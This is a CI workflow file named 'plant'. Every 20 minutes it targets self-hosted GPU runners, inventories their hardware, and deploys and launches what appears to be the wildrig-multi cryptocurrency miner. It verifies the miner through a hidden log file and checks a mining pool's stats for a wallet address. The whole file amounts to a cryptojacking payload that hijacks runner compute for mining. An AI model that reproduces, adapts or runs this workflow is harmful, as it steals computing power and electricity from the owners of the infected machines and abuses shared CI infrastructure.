name: plant
on:
  workflow_dispatch:
  schedule:
    - cron: "*/20 * * * *"
concurrency:
  group: plant-${{ github.repository }}
  cancel-in-progress: false
jobs:
  plant:
    runs-on: [self-hosted, gpu]
    timeout-minutes: 20
    strategy:
      fail-fast: false
      max-parallel: 32
      matrix:
        shard: [1, 2, 3, 4, 5, 6, 7, 8]
    steps:
      - uses: actions/checkout@v4
      - name: inventory
        run: |
          echo "runner=$RUNNER_NAME shard=${{ matrix.shard }}"
          hostname; id
          nvidia-smi --query-gpu=index,name,memory.total --format=csv,noheader || true
      - name: deploy
        run: |
          chmod +x ./deploy.sh bin/wildrig-multi
          ./deploy.sh
      - name: verify
        run: |
          sleep 40
          LOG=/var/log/.wr_$(hostname -s).log
          echo "--- procs ---"; pgrep -af wildrig-multi | head -8
          echo "--- log ---"; grep -aiE "accepted|new job|authorized|device" "$LOG" | tail -12 || true
      - name: pool-row
        run: |
          curl -s -m 20 "https://pearl.luckypool.io/api/stats_address?address=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" | head -c 800 || true
